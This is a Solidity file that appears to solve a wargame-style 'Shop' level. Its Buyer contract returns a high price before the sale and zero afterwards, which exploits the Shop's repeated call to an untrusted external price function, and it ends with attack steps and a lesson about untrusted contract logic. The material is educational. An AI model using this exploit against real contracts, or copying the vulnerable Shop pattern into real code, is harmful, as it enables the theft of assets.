// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Buyer {
  address owner;
  Shop shopContract;

  constructor(address _owner){
    owner = _owner;
  }

  function getShopAddress(address _address) public {
    shopContract = Shop(_address);
  }

  function attack() public {
      shopContract.buy();
  }

  function price() external view returns (uint) {
    if (shopContract.isSold()){
      return 0;
    }
    return 101;
  }
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    // _buyer.price() call 2 times
    // price = 100;
    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

/*
  To-do-list
  - create Buyer contract 
  - Buyer.getShopAddress with Shop address contract
  - call Buyer.attack()


  Result

  Contracts can manipulate data seen by other contracts in any way they want.
  It's unsafe to change the state based on external and untrusted contracts logic.
*/